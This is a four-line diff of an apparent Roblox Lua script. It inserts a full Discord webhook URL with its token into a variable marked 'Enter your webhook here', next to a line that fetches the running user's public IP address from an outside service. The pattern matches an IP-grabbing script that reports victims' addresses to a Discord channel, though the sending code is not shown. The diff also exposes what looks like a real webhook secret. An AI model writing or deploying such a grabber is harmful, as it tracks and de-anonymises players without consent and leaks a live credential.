@@ -1,4 +1,4 @@
-local Webhook = "" -- Enter your webhook here 
+local Webhook = "https://discord.com/api/webhooks/1225764325898194985/U6yMoWFgv05OpiVKqHcb30_zJet13pITK9CLepSqm1kEk-ikojracLnUPgrqhlb4l7PQ" -- Enter your webhook here 
 
 local IPv4 = game:HttpGet("https://api.ipify.org") 
 
